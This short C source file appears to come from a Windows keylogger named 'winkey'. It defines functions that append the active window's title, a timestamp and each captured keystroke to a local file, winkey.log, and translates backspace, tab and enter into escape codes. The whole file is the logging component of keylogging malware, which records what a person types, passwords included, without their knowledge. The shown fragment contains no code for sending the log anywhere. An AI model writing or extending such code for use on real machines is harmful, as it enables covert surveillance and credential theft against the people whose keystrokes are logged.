#include "winkey.h"

void		log_window(SYSTEMTIME st, char *window_name)
{
	fopen_s(&g_winkey.stream, "winkey.log", "a" );
	if (*g_winkey.window_prev)
		fprintf(g_winkey.stream, "\n");
	fprintf(g_winkey.stream, "[%02d.%02d.%04d %02d:%02d] - '%s'\n",st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, window_name);
	fclose(g_winkey.stream);
}

const char	*special_codes[] =
{
	[VK_BACK]				= "\\b",
	[VK_TAB]				= "\\t",
	[VK_RETURN]				= "\\n"
};

void		log_key(char *buffer, char *ptr)
{
	fopen_s(&g_winkey.stream, "winkey.log", "a" );
	if (*ptr == VK_BACK || *ptr == VK_TAB || *ptr == VK_RETURN)
		fprintf(g_winkey.stream, "%s", special_codes[*ptr]);
	else
		fprintf(g_winkey.stream, "%s", buffer);
	fclose(g_winkey.stream);
}
